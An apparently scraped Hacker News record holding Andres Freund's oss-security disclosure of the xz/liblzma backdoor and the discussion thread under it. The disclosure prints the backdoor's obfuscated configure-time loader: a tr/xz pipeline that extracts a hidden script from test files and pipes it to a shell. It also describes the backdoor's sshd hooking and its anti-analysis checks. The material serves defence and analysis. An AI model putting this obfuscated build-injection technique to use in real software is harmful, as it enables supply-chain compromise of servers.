[
  {
    "id": 39865810,
    "title": "Critical Backdoor Discovered in xz/liblzma Threatening SSH Servers",
    "originLink": "https://www.openwall.com/lists/oss-security/2024/03/29/4",
    "originBody": "Products Openwall GNU/*/Linux server OS Linux Kernel Runtime Guard John the Ripper password cracker Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS Wordlists for password cracking passwdqc policy enforcement Free & Open Source for Unix Pro for Windows (Active Directory) yescrypt KDF & password hashing yespower Proof-of-Work (PoW) crypt_blowfish password hashing phpass ditto in PHP tcb better password shadowing Pluggable Authentication Modules scanlogd port scan detector popa3d tiny POP3 daemon blists web interface to mailing lists msulogin single user mode login php_mt_seed mt_rand() cracker Services Publications Articles Presentations Resources Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs What's new Follow @Openwall on Twitter for new release announcements and other news [] [thread-next>] [day] [month] [year] [list] Date: Fri, 29 Mar 2024 08:51:26 -0700 From: Andres FreundTo: oss-security@...ts.openwall.com Subject: backdoor in upstream xz/liblzma leading to ssh server compromise Hi, After observing a few odd symptoms around liblzma (part of the xz package) on Debian sid installations over the last weeks (logins with ssh taking a lot of CPU, valgrind errors) I figured out the answer: The upstream xz repository and the xz tarballs have been backdoored. At first I thought this was a compromise of debian's package, but it turns out to be upstream. == Compromised Release Tarball == One portion of the backdoor is *solely in the distributed tarballs*. For easier reference, here's a link to debian's import of the tarball, but it is also present in the tarballs for 5.6.0 and 5.6.1: https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63 That line is *not* in the upstream source of build-to-host, nor is build-to-host used by xz in git. However, it is present in the tarballs released upstream, except for the \"source code\" links, which I think github generates directly from the repository contents: https://github.com/tukaani-project/xz/releases/tag/v5.6.0 https://github.com/tukaani-project/xz/releases/tag/v5.6.1 This injects an obfuscated script to be executed at the end of configure. This script is fairly obfuscated and data from \"test\" .xz files in the repository. This script is executed and, if some preconditions match, modifies $builddir/src/liblzma/Makefile to contain am__test = bad-3-corrupt_lzma2.xz ... am__test_dir=$(top_srcdir)/tests/files/$(am__test) ... sed rpath $(am__test_dir)$(am__dist_setup) >/dev/null 2>&1 which ends up as ...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xztr \"\\-_\" \"_\\-\"xz -d/bin/bash >/dev/null 2>&1; ... Leaving out the \"| bash\" that produces ####Hello#### #��Z�.hj� eval `grep ^srcdir= config.status` if test -f ../../config.status;then eval `grep ^srcdir= ../../config.status` srcdir=\"../../$srcdir\" fi export i=\"((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)\";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr \"\\5-\\51\\204-\\377\\52-\\115\\132-\\203\\0-\\4\\116-\\131\" \"\\0-\\377\")|xz -F raw --lzma1 -dc|/bin/sh ####World#### After de-obfuscation this leads to the attached injected.txt. == Compromised Repository == The files containing the bulk of the exploit are in an obfuscated form in tests/files/bad-3-corrupt_lzma2.xz tests/files/good-large_compressed.lzma committed upstream. They were initially added in https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0 Note that the files were not even used for any \"tests\" in 5.6.0. Subsequently the injected code (more about that below) caused valgrind errors and crashes in some configurations, due the stack layout differing from what the backdoor was expecting. These issues were attempted to be worked around in 5.6.1: https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92 For which the exploit code was then adjusted: https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89 Given the activity over several weeks, the committer is either directly involved or there was some quite severe compromise of their system. Unfortunately the latter looks like the less likely explanation, given they communicated on various lists about the \"fixes\" mentioned above. Florian Weimer first extracted the injected code in isolation, also attached, liblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks! == Affected Systems == The attached de-obfuscated script is invoked first after configure, where it decides whether to modify the build process to inject the code. These conditions include targeting only x86-64 linux: if ! (echo \"$build\"grep -Eq \"^x86_64\" > /dev/null 2>&1) && (echo \"$build\"grep -Eq \"linux-gnu$\" > /dev/null 2>&1);then Building with gcc and the gnu linker if test \"x$GCC\" != 'xyes' > /dev/null 2>&1;then exit 0 fi if test \"x$CC\" != 'xgcc' > /dev/null 2>&1;then exit 0 fi LDv=$LD\" -v\" if ! $LDv 2>&1grep -qs 'GNU ld' > /dev/null 2>&1;then exit 0 Running as part of a debian or RPM package build: if test -f \"$srcdir/debian/rules\" || test \"x$RPM_ARCH\" = \"xx86_64\";then Particularly the latter is likely aimed at making it harder to reproduce the issue for investigators. Due to the working of the injected code (see below), it is likely the backdoor can only work on glibc based systems. Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux distributions, and where they have, mostly in pre-release versions. == Observing Impact on openssh server == With the backdoored liblzma installed, logins via ssh become a lot slower. time ssh nonexistant@...alhost before: nonexistant@...alhost: Permission denied (publickey). before: real 0m0.299s user 0m0.202s sys 0m0.006s after: nonexistant@...alhost: Permission denied (publickey). real 0m0.807s user 0m0.202s sys 0m0.006s openssh does not directly use liblzma. However debian and several other distributions patch openssh to support systemd notification, and libsystemd does depend on lzma. Initially starting sshd outside of systemd did not show the slowdown, despite the backdoor briefly getting invoked. This appears to be part of some countermeasures to make analysis harder. Observed requirements for the exploit: a) TERM environment variable is not set b) argv[0] needs to be /usr/sbin/sshd c) LD_DEBUG, LD_PROFILE are not set d) LANG needs to be set e) Some debugging environments, like rr, appear to be detected. Plain gdb appears to be detected in some situations, but not others To reproduce outside of systemd, the server can be started with a clear environment, setting only the required variable: env -i LANG=en_US.UTF-8 /usr/sbin/sshd -D In fact, openssh does not need to be started as a server to observe the slowdown: slow: env -i LANG=C /usr/sbin/sshd -h (about 0.5s on my older system) fast: env -i LANG=C TERM=foo /usr/sbin/sshd -h env -i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h ... (about 0.01s on the same system) It's possible that argv[0] other /usr/sbin/sshd also would have effect - there are obviously lots of servers linking to libsystemd. == Analyzing the injected code == I am *not* a security researcher, nor a reverse engineer. There's lots of stuff I have not analyzed and most of what I observed is purely from observation rather than exhaustively analyzing the backdoor code. To analyze I primarily used \"perf record -e intel_pt//ub\" to observe where execution diverges between the backdoor being active and not. Then also gdb, setting breakpoints before the divergence. The backdoor initially intercepts execution by replacing the ifunc resolvers crc32_resolve(), crc64_resolve() with different code, which calls _get_cpuid(), injected into the code (which previously would just be static inline functions). In xz 5.6.1 the backdoor was further obfuscated, removing symbol names. These functions get resolved during startup, because sshd is built with -Wl,-z,now, leading to all symbols being resolved early. If started with LD_BIND_NOT=1 the backdoor does not appear to work. Below crc32_resolve() _get_cpuid() does not do much, it just sees that a 'completed' variable is 0 and increments it, returning the normal cpuid result (via a new _cpuid()). It gets to be more interesting during crc64_resolve(). In the second invocation crc64_resolve() appears to find various information, like data from the dynamic linker, program arguments and environment. Then it perform various environment checks, including those above. There are other checks I have not fully traced. If the above decides to continue, the code appears to be parsing the symbol tables in memory. This is the quite slow step that made me look into the issue. Notably liblzma's symbols are resolved before many of the other libraries, including the symbols in the main sshd binary. This is important because symbols are resolved, the GOT gets remapped read-only thanks to -Wl,-z,relro. To be able to resolve symbols in libraries that have not yet loaded, the backdoor installs an audit hook into the dynamic linker, which can be observed with gdb using watch _rtld_global_ro._dl_naudit It looks like the audit hook is only installed for the main binary. That hook gets called, from _dl_audit_symbind, for numerous symbols in the main binary. It appears to wait for \"RSA_public_decrypt@....plt\" to be resolved. When called for that symbol, the backdoor changes the value of RSA_public_decrypt@....plt to point to its own code. It does not do this via the audit hook mechanism, but outside of it. For reasons I do not yet understand, it does change sym.st_value *and* the return value of from the audit hook to a different value, which leads _dl_audit_symbind() to do nothing - why change anything at all then? After that the audit hook is uninstalled again. It is possible to change the got.plt contents at this stage because it has not (and can't yet) been remapped to be read-only. I suspect there might be further changes performed at this stage. == Impact on sshd == The prior section explains that RSA_public_decrypt@....plt was redirected to point into the backdoor code. The trace I was analyzing indeed shows that during a pubkey login the exploit code is invoked: sshd 1736357 [010] 714318.734008: 1 branches:uH: 5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) => 5555555612d0 RSA_public_decrypt@...+0x0 (/usr/sbin/sshd) The backdoor then calls back into libcrypto, presumably to perform normal authentication sshd 1736357 [010] 714318.734009: 1 branches:uH: 7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) => 7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3) I have not yet analyzed precisely what is being checked for in the injected code, to allow unauthorized access. Since this is running in a pre-authentication context, it seems likely to allow some form of access or other form of remote code execution. I'd upgrade any potentially vulnerable system ASAP. == Bug reports == Given the apparent upstream involvement I have not reported an upstream bug. As I initially thought it was a debian specific issue, I sent a more preliminary report to security@...ian.org. Subsequently I reported the issue to distros@. CISA was notified by a distribution. Red Hat assigned this issue CVE-2024-3094. == Detecting if installation is vulnerable == Vegard Nossum wrote a script to detect if it's likely that the ssh binary on a system is vulnerable, attached here. Thanks! Greetings, Andres Freund View attachment \"injected.txt\" of type \"text/plain\" (8236 bytes) Download attachment \"liblzma_la-crc64-fast.o.gz\" of type \"application/gzip\" (36487 bytes) Download attachment \"detect.sh\" of type \"application/x-sh\" (426 bytes) Powered by blists - more mailing lists Please check out the Open Source Software Security Wiki, which is counterpart to this mailing list. Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.",
    "commentLink": "https://news.ycombinator.com/item?id=39865810",
    "commentBody": "Backdoor in upstream xz/liblzma leading to SSH server compromise (openwall.com)3513 points by rkta 17 hours agohidepastfavorite1252 comments rwmj 17 hours agoVery annoying - the apparent author of the backdoor was in communication with me over several weeks trying to get xz 5.6.x added to Fedora 40 & 41 because of it's \"great new features\". We even worked with him to fix the valgrind issue (which it turns out now was caused by the backdoor he had added). We had to race last night to fix the problem after an inadvertent break of the embargo. He has been part of the xz project for 2 years, adding all sorts of binary test files, and to be honest with this level of sophistication I would be suspicious of even older versions of xz until proven otherwise. reply jonathanspw 16 hours agoparentYesterday sure was fun wasn't it :p Thanks for all your help/working with me on getting this cleaned up in Fedora. reply w4ffl35 6 hours agorootparentIs it normal that when I try to uninstall xz it is trying to install lzma? reply inetknght 4 hours agorootparentIt means that `xz` was depended upon by something that depends on eg \"xz OR lzma\" reply junon 10 hours agoparentprevGitHub has suspended @JiaT75's account. EDIT: Lasse Collin's account @Larhzu has also been suspended. EDIT: Github has disabled all Tukaani repositories, including downloads from the releases page. -- EDIT: Just did a bit of poking. xz-embedded was touched by Jia as well and it appears to be used in the linux kernel. I did quick look and it doesn't appear Jia touched anything of interest in there. I also checked the previous mirror at the tukaani project website, and nothing was out of place other than lagging a few commits behind: https://gist.github.com/Qix-/f1a1b9a933e8847f56103bc14783ab7... -- Here's a mailing list message from them ca. 2022. https://listor.tp-sv.se/pipermail/tp-sv_listor.tp-sv.se/2022... -- MinGW w64 on AUR was last published by Jia on Feb 29: https://aur.archlinux.org/cgit/aur.git/log/?h=mingw-w64-xz (found by searching their public key: 22D465F2B4C173803B20C6DE59FCF207FEA7F445) -- pacman-static on AUR still lists their public key as a contributor, xz was last updated to 5.4.5 on 17-11-2023: https://aur.archlinux.org/cgit/aur.git/?h=pacman-static EDIT: I've emailed the maintainer to have the key removed. -- Alpine was patched as of 6 hours ago. https://git.alpinelinux.org/aports/commit/?id=982d2c6bcbbb57... -- OpenSUSE is still listing Jia's public key: https://sources.suse.com/SUSE:SLE-15-SP6:GA/xz/576e550c49a36... (cross-ref with https://web.archive.org/web/20240329235153/https://tukaani.o...) EDIT: Spoke with some folks in the package channel on libera, seems to be a non-issue. It is not used as attestation nor an ACL. -- Arch appears to still list Jia as an approved publisher, if I'm understanding this page correctly. https://gitlab.archlinux.org/archlinux/packaging/packages/xz... EDIT: Just sent an email to the last committer to bring it to their attention. EDIT: It's been removed. -- jiatan's Libera info indicates they registered on Dec 12 13:43:12 2022 with no timezone information. -NickServ- Information on jiatan (account jiatan): -NickServ- Registered : Dec 12 13:43:12 2022 +0000 (1y 15w 3d ago) -NickServ- Last seen : (less than two weeks ago) -NickServ- User seen : (less than two weeks ago) -NickServ- Flags : HideMail, Private -NickServ- jiatan has enabled nick protection -NickServ- *** End of Info *** /whowas expired not too long ago, unfortunately. If anyone has it I'd love to know. They are not registered on freenode. EDIT: Libera has stated they have not received any requests for information from any agencies as of yet (30th Saturday March 2024 00:39:31 UTC). EDIT: Jia Tan was using a VPN to connect; that's all I'll be sharing here. reply junon 7 hours agorootparentJust for posterity since I can no longer edit: Libera staff has been firm and unrelenting in their position not to disclose anything whatsoever about the account. I obtained the last point on my own. Libera has made it clear they will not budge on this topic, which I applaud and respect. They were not involved whatsoever in ascertaining a VPN was used, and since that fact makes anything else about the connection information moot, there's nothing else to say about it. reply Phenylacetyl 2 hours agorootparentprevThe alpine patch includes gettext-dev which is likely also exploited as the same authors have been pushing gettext to projects where their changes have been questioned reply mook 1 hour agorootparentprevFWIW, that's mingw-w64-xz (cross-compiled xz utils) in AUR, not ming-w64 (which would normally refer to the compiler toolchain itself). reply pfortuny 15 hours agoparentprevUnfortunately, this is how good bad actors work: with a very long-term point of view. There is no “harmless” project any more. reply jnxx 11 hours agorootparentAnd, Joey Hess has counted at least 750 commits to xz from that handle. https://hachyderm.io/@joeyh/112180715824680521 This does not look trust-inspiring. If the code is complex, there could be many more exploits hiding. reply ebfe1 10 hours agorootparentclickhouse has pretty good github_events dataset on playground that folks can use to do some research - some info on the dataset https://ghe.clickhouse.tech/ Example of what this user JiaT75 did so far: https://play.clickhouse.com/play?user=play#U0VMRUNUICogRlJPT... pull requests mentioning xz, 5.6 without downgrade, cve being mentioned in the last 60 days: https://play.clickhouse.com/play?user=play#U0VMRUNUIGNyZWF0Z... reply codedokode 2 hours agorootparentprev> If the code is complex, there could be many more exploits hiding. Then the code should not be complex. Low-level hacks and tricks (like pointer juggling) should be not allowed and simplicity and readability should be preferred. reply jnxx 4 hours agorootparentprevIf this is a conspiracy or a state-sponsored attack, they might have gone specifically for embedded devices and the linux kernel. Here archived from tukaani.org: https://web.archive.org/web/20110831134700/http://tukaani.or... > XZ Embedded is a relatively small decompressor for the XZ format. It was developed with the Linux kernel in mind, but is easily usable in other projects too. > *Features* > * Compiled code 8-20 KiB > [...] > * All the required memory is allocated at initialization time. This is targeted at embedded and real-time stuff. Could even be part of boot loaders in things like buildroot or RTEMS. And this means potentially millions of devices, from smart toasters or toothbrushes to satellites and missiles which most can't be updated with security fixes. reply jnxx 2 hours agorootparentOne scenario for malicious code in embedded devices would be a kind of killswitch which listens to a specific byte sequence and crashes when encountering it. For a state actor, having such an exploit would be gold. reply jnxx 3 hours agorootparentprevAlso, the XZ file format, which was designed by Lasse Collins, was analyzed and seems to have a number of problems in terms of reliability and security: https://www.nongnu.org/lzip/xz_inadequate.html reply masklinn 2 hours agorootparentThat is just technical disagreements and sour grapes by someone involved in a competing format (Lzip). There’s no evidence Lasse did anything “wrong” beyond looking for / accepting co-maintainers, something package authors are taken to task for not doing every time they have life catching up or get fed up and can’t / won’t spend as much time on the thing. reply jnxx 2 hours agorootparentYou appeal to trust people and give them the benefit of doubt which is normally a good thing. But is this appropiate here? If this is a coordinated long-term effort by a state entity, there is no reason to trust the supposed creator of the project, especially given what it was targeting from the start. reply masklinn 1 hour agorootparent> You appeal to trust people and give them the benefit of doubt which is normally a good thing. But is this appropiate here? Yes. Without evidence to the contrary there is no reason to believe Lasse has been anything other than genuine so all you're doing is insulting and slandering them out of personal satisfaction. And conspiratorial witch hunts are actively counter-productive, through that mode of thinking it doesn't take much imagination to figure out you are part of the conspiracy for instance. reply jnxx 11 minutes agorootparentThe thing is there are two possibilities: 1. An important project has an overburdened / burnt out maintainer, and that project is taken over by a persona who appears to help kindly, but is part of a campaign of a state actor. 2. A state actor is involved in setting up such a project from the start. The first possibility is not only being an asshole to the original maintainer, but it is also more risky - that original maintainer surely feels responsible for his creation and could ring alarm bells. This is not unlikely because he knows the code. And alarm bells is something that state actors do not like. The second possibility has the risk of the project not being successful, which would mean a serious investment in resources to fail. But that could be countered by having competent people working on that. And in that case, you don't have any real persons,just account names. What happened here? I don't know. w4ffl35 19 minutes agorootparentprevWhat if the maintainer IS the hacker? Where's the evidence they're two different people? I don't think these things are true but calling into question motivations and asking more questions isn't slander (plus it's written which would make it libel, but it's not that either). We are all affected by this, so these are valid concerns. reply matsemann 2 hours agorootparentprev> But is this appropiate here? Yes, nothing points to the inventor of the format and maintainer for decades has done anything with the format to make it suspect. If so, the recent backdoor wouldn't be needed. It's good to be skeptic, but don't drag people through the mud without anything to back it up. reply jnxx 1 hour agorootparentIf a project targets a high-profile, very security sensitive project like the linux kernel from the start, as the archived tukaani web site linked above shows, it is justified to ask questions. Also, the exploit shows a high effort, and a high level of competence, and a very obvious willingness to play a long game. These are not circumstances for applying Hanlon's razor. reply matsemann 52 minutes agorootparentAre you raising the same concerns and targeting individuals behind all other sensitive projects? No, because that would be insane. It's weird to have one set of standards to a maintainer since 2009 or so, and different standards for others. This witch hunt is just post-hoc smartassery. reply voidz 2 hours agorootparentprevIt argues the topic pretty well: xz is unsuitable for long-term archival. The arguments are in-depth and well worded. Do you have any argument to the contrary beyond \"sour grapes\"? reply matsemann 2 hours agorootparentIt's not relevant to the current issue at hand. reply shzhdbi09gv8ioi 2 hours agorootparentprevThis link is opinion piece about the file format and has nothing to do with today's news. Also, Lasse has not been accused of any wrong-doings. reply varjag 1 hour agorootparentHis GH account was suspended, in what I believe a very unfortunate case of collateral damage. reply jnxx 2 hours agorootparentprevYou mean, the xz file format has nothing to do with xz-utils? reply shzhdbi09gv8ioi 2 hours agorootparentNo. I mean that the link you shared is a opinion piece about the xz file format, and those opinions are fully unrelated to today's news and only serve to further discredit Lasse Collin who for all we know have been duped and tricked by a nation state, banned by github and is having a generally shitty time. Why are you trying to discredit Lasse? reply varjag 1 hour agorootparentprevAll this circus makes me happy for never moving from sysvinit on embedded. reply jnxx 1 hour agorootparentIt is not just systemd which uses xz. For example, Debian's dpkg links xz-utils. reply ahartmetz 2 minutes agorootparentHowever, this particular attack only works through libsystemd to compromise sshd. indigodaddy 8 hours agorootparentprevAnyone have any level of confidence that for example EL7/8 would not be at risk even if more potential exploits at play? reply Gelob 6 hours agorootparentRedHat blog says no versions of RHEL are affected. https://www.redhat.com/en/blog/urgent-security-alert-fedora-... reply alex_duf 1 hour agorootparentAh the grieving steps of a company: We don't have a security problem The security problem isn't affecting anyone The people affected are only few We're sorry about the security problem, please change your password reply Zenul_Abidin 7 hours agorootparentprevI don't think EL7 gets minor version updates anymore though reply soraminazuki 8 hours agorootparentprevI wouldn't count on it. RedHat packages contain lots of backported patches. reply indigodaddy 6 hours agorootparentRight, that notion was what was making me nervous reply worthless-trash 4 hours agorootparentAt least in my group, the backports are hand picked to solve specific problems, not just random wholesale backports. reply soraminazuki 3 hours agorootparentSure, they aren't backporting patches wholesale. But the patches that did get backported, if any, needs much more scrutiny given the situation. The thing about enterprise Linux distros is that they have a long support period. Bug fixes and security patches pile up. Fortunately though, xz doesn't seem to have a lot of backported patches. https://git.centos.org/rpms/xz/blob/c8s/f/SPECS/xz.spec https://git.centos.org/rpms/xz/blob/c7/f/SPECS/xz.spec But take glibc for example. The amount of patches makes my head spin. https://git.centos.org/rpms/glibc/blob/c8s/f/SPECS/glibc.spe... reply bobba27 1 hour agorootparentprevFor the duration of a major release, up until ~x.4 pretty much everything from upstream gets backported with a delay of 6-12 months, depending on how conservative to change the rhel engineer maintaining this part of the kernel is. After ~x.4 things slow down and only \"important\" fixes get backported but no new features. After ~x.7 or so different processes and approvals come into play and virtually nothing except high severity bugs or something that \"important customer\" needs will be backported. reply worthless-trash 1 hour agorootparentSadly, 8.6 and 9.2 kernel are the exception to this. Mainly as they are openshift container platform and fedramp requirements. The goal is that 8.6, 9.2 and 9.4 will have releases at least every two weeks. Maybe soon all Z streams will have a similar release cadence to keep up with the security expectations, but will keep a very similar expectations that you outlined above. reply waynesonfire 9 hours agorootparentprev750 commits... is xz able to send e-mails yet? reply wyldfire 9 hours agorootparentNo. But if you have any centrifuges they will probably exhibit inconsistent behavior. reply shermantanktop 6 hours agorootparentMaybe it’s the centrifuges which will send the mail, making the world’s first uranium-enriching spam botnet. reply lovasoa 2 hours agorootparentprevYes, it sends an email containing your private key on installation. reply hangonhn 14 hours agorootparentprevI imagine it might be easier to just compromise a weakly protected account than to actual put in a 2 years long effort with real contributions. If we mandated MFA for all contributors who contribute to these really important projects then we can know with greater certainty if it was really a long con vs. a recently compromised account. reply tw04 6 hours agorootparentFor some random server, sure. For a state sponsored attack? Having an embedded exploit you can use when convenient, or better yet an unknown exploit affecting every linux-based system connected to the internet that you can use when war breaks out - that's invaluable. reply eru 4 hours agorootparentYes, but even states have only finite resources, so even for them compromising an account would be cheaper. (But you are right that a sleeper would be affordable for them.) reply treflop 4 hours agorootparentHaving one or two people on payroll to occasionally add commits to a project isn't exactly that expensive if it pays off. There are ~29,000,000 US government employees (federal, state and local). Other countries like China and India have tens of millions of government employees. reply danieldk 2 hours agorootparentAnd they might as well be working on compromising other projects using different handles. reply gamer191 2 hours agorootparentprevThis PR from July 8 2023 is suspicious, so it was very likely a long con: https://github.com/google/oss-fuzz/pull/10667 reply guinea-unicorn 12 hours agorootparentprevI find it funny how MFA is treated as if it would make account takeover suddenly impossible. It's just a bit more work, isn't it? And a big loss in convenience. I'd much rather see passwords entirely replaced by key-based authentication. That would improve security. Adding 2FA to my password is just patching a fundamentally broken system. reply ryukoposting 11 hours agorootparentCustomer service at one of my banks has an official policy of sending me a verification code via email that I then read to them over the phone, and that's not even close to the most \"wrong\" 2FA implementation I've ever seen. Somehow that institution knows what a YubiKey is, but several major banks don't. reply eairy 5 hours agorootparentI'm security consultant in the financial industry. I've literally been involved in the decision making on this at a bank. Banks are very conservative, and behave like insecure teenagers. They won't do anything bold, they all just copy each other. I pushed YubiKey as a solution and explained in detail why SMS was an awful choice, but they went with SMS anyway. It mostly came down to cost. SMS was the cheapest option. YubiKey would involve buying and sending the keys to customers, and they having the pain/cost of supporting them. There was also the feeling that YubiKeys were too confusing for customers. The nail in the coffin was \"SMS is the standard solution in the industry\" plus \"If it's good enough for VISA it's good enough for us\". reply heyoni 5 hours agorootparentBut why won’t banks at least support customer provided yubikeys? reply jalk 12 minutes agorootparentBank of America supports user purchased TOTP devices. https://www.bankofamerica.com/security-center/online-mobile-... mulmen 4 hours agorootparentprev> But why won’t banks at least support customer provided yubikeys? > support You answered your own question. reply intelVISA 3 hours agorootparentprevBanks loathe anything relating, or adjacent, to good SWE principles. reply eru 4 hours agorootparentprevBecause it's extra hassle? reply Liquix 9 hours agorootparentprevFinancial institutions are very slow to adopt new tech. Especially tech that will inevitably cost $$$ in support hours when users start locking themselves out of their accounts. There is little to no advantage to being the first bank to implement YubiKey 2FA. To a risk-averse org, the non-zero chance of a botched rollout or displeased customers outweighs any potential benefit. reply monksy 9 hours agorootparentThey're pretty terrible when they do. For the longest time the max password size was 8 characters and the csr knew what your password was. Heck I've had Chase security tell me they'd call me back.. dude that's exactly how people get compromised. reply biglost 5 hours agorootparentA friensd bank, hopefully not the one i use, only allow a password off 6 digits. Yes You read it right, 6 fucking digits to login, i hace him the asvice to run away from that shitty bank reply foepys 3 hours agorootparentDid this bank start out as a \"telephone bank\"? One of the largest German consumer banks still does this because they were the first \"direct bank\" without locations and typing in digits on the telephone pad was the most secure way of authenticating without telling the \"bank teller\" your password. So it was actually a good security measure but it is apparently too complicated to update their backend to modern standards. They do require 2FA, though. reply asm0dey 1 hour agorootparentDiBa? reply darkr 3 hours agorootparentprev> There is little to no advantage to being the first bank to implement YubiKey 2FA Ideally they’d just implement passkeys (webauthn/fido). More secure, and it works with iOS, android, 1password, and yubikeys reply doubled112 9 hours agorootparentprevExactly. 8 character password in the 2010s as the only factor was fine. It was only my money we're talking about. Now I have to wait for an SMS. Great... reply throwaway2990 5 hours agorootparentSMS is fine on most countries. It’s just America is dumb and allows number transfers to anyone. reply hwertz 3 hours agorootparentNope, I read The Register (UK based) and they've had scandals from celebrities having their confidential SMS messages leaked; SMS spoofing; I think they even have SIM cloning going on every now and then in UK and some European countries. (since The Register is a tech site, my recollection is some carriers took technical measures to prevent these issues while quite a few didn't.) I don't think it's a thing that happens that often in UK etc.; but, it doesn't happen that frequently in the US either. It's just a thing that can potentially happen. reply throwaway2990 2 hours agorootparentUK has plenty of other problems to solve first with identity thief. reply KiwiJohnno 4 hours agorootparentprevIts also been a problem in Australia, Optus (2nd biggest teleco) used to allow number porting or activating sim against an existing account with a bare minimum of detail - Like a name, address and date of birth. If you had those details of a target you could clone their SIM and crack any SMS based MFA. reply StillBored 4 hours agorootparentprevSMS is not E2E encrypted, so for all intents is just a plain text message that can/has been snooped. Might as well just send a plaintext emails as well. reply eru 4 hours agorootparentprevNumber transfers in other countries is also mostly just a question of a bit of social engineering. reply throwaway2990 2 hours agorootparentNo. Most require some form of identification or matching identification between mobile providers. reply grepfru_it 5 hours agorootparentprevUh many banks provide MFA. And secure with hardware keys. It’s just that your level of assets doesn’t warrant that kind of protection. Source: worked at all the major banks, all the wealthy clients use hardware MFA reply wsc981 2 hours agorootparentThe bank I used in The Netherlands provides a MFA device as well. The device requires an ATM card as well to generate a random number. This is the default for all their customers, wealthy or not. https://www.abnamro.nl/en/commercialbanking/internetbanking/... reply heyoni 5 hours agorootparentprevThey’re a bank. If they can secure their portals with hardware keys, at least allow customers to onboard their own keys. reply LtWorf 3 hours agorootparentprevMy bank gave me an hardware token to protect my 5k€ account. Get better banks people :) reply gonzo41 1 hour agorootparentprevBanks are in a tough spot. Remember, banks have you as a customer, they also have a 100 year old person who still wants to come to the branch in person as a customer. Not everyone can grapple with the idea of a Yubikey, or why their bank shouldn't be protecting their money like it did in the past. reply krinchan 8 hours agorootparentprevJust say BofA. reply snnn 4 hours agorootparentNot actually. Even if you enabled passkey, you still can login to their phone app via SMS. So it is not more secure. People who knows how to do SMS attacks certainly knows how to install a mobile app. And BofA gave their customers a fake assurance. reply hangonhn 12 hours agorootparentprevyeah someone replied to one of my comments about adding MFA that an attacker can get around all that simply by buying the account from the author. I was way too narrowly focused on the technical aspects and was completely blind to other avenues like social engineering, etc. All very fair points. reply AgentME 10 hours agorootparentprevPasskeys are being introduced right now in browsers and popular sites like a MFA option, but I think the intention is that they will grow and become the main factor in the future. reply riddley 9 hours agorootparentFrom what I've seen they're all controlled by huge tech companies. Hard pass. reply pabs3 10 minutes agorootparentKeepassXC is working on supporting them natively in software, so you would not need to trust big tech companies, unless you are logging into a service that requires attestation to be enabled. reply doubled112 9 hours agorootparentprevI liked the username, password and TOTP combination. I could choose my own password manager, and TOTP generator app, based on my preferences. I have a feeling this won't hold true forever. Microsoft has their own authenticator now, Steam has another one, Google has their \"was this you?\" built into the OS. Monetization comes next? \"View this ad before you login! Pay 50c to stay logged in for longer?\" reply AgentME 6 hours agorootparentPasskeys are an open standard with multiple implementations. It represents the opposite of the trend you're worried about there. reply tux3 1 hour agorootparentMS Azure Active Entra's FIDO2 implementation only allows a select list of vendors. You need a certification from FIDO ($,$$$), you need to have an account that can upload on the MDS metadata service, and you need to talk to MS to see if they'll consider adding you to the list It's not completely closed, but in practice no one on that list is a small independent open source project, those are all the kind of entrenched corporate security companies you'd expect reply thayne 5 hours agorootparentprevBut the way it is designed, you can require a certain provider, and you can bet at least some sites will start requiring attestation from Google and or Apple. reply wepple 5 hours agorootparentprevTOTP has substantial security gaps to make it a non-starter. Maybe a pubkey system where you choose your own client would be what you’re looking for? reply pabs3 9 minutes agorootparentTLS Client Certs (aka mTLS) is an option for that, but the browser UI stuff for it is terrible and getting worse. LoganDark 3 hours agorootparentprev> Google has their \"was this you?\" built into the OS. Not only that, but it's completely impossible to disable or remove that functionality or even make TOTP the primary option. Every single time I try to sign in, Google prompts my phone first, giving me a useless notification for later, and I have to manually click a couple of buttons to say \"no I am not getting up to grab my phone and unlock it for this bullshit, let me enter my TOTP code\". Every single time. reply pabs3 11 minutes agorootparentprevThey also require JavaScript to work unfortunately. reply AgentME 6 hours agorootparentprevI don't understand this criticism. What is being controlled? Passkeys are an open standard that a browser can implement with public key crypto. reply ndriscoll 5 hours agorootparentDoesn't passkeys give the service a signature to prove what type of hardware device you're using? e.g. it provides a way for the server to check whether you are using a software implementation? It's not really open if it essentially has type of DRM built in. reply LoganDark 3 hours agorootparentYou're thinking of hardware-backed attestation, which provides a hardware root of trust. I believe passkeys are just challenge-response (using public key cryptography). You could probably add some sort of root of trust (for example, have the public key signed by the HSM that generated it) but that would be entirely additional to the passkey itself. reply pabs3 7 minutes agorootparentPasskeys do have the option 